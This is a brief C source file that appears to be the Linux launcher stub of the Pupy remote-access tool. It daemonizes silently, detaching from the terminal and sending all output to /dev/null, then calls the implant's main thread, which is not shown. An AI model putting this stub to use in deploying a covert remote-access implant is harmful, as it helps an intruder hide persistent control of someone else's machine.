#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/fs.h>

#include "pupy_load.h"

int main(int argc, char *argv[]){
#ifndef DEBUG
    pid_t pid;
    int i;

    /* create new process */
    pid = fork ( );
    if (pid == -1)
        return -1;

    else if (pid != 0)
        exit (EXIT_SUCCESS);

    /* create new session and process group */
    if (setsid ( ) == -1)
        return -1;

    /* set the working directory to the root directory */
    if (chdir ("/") == -1)
        return -1;

    /* close all open files--NR_OPEN is overkill, but works */
    for (i = 0; i < sysconf(_SC_OPEN_MAX); i++)
        close (i);

    /* redirect fd's 0,1,2 to /dev/null */
    open ("/dev/null", O_RDWR);
    /* stdin */
    dup (0);
    /* stdout */
    dup (0);
    /* stderror */

    /* do its daemon thing... */
#endif

	return mainThread(argc, argv);
}
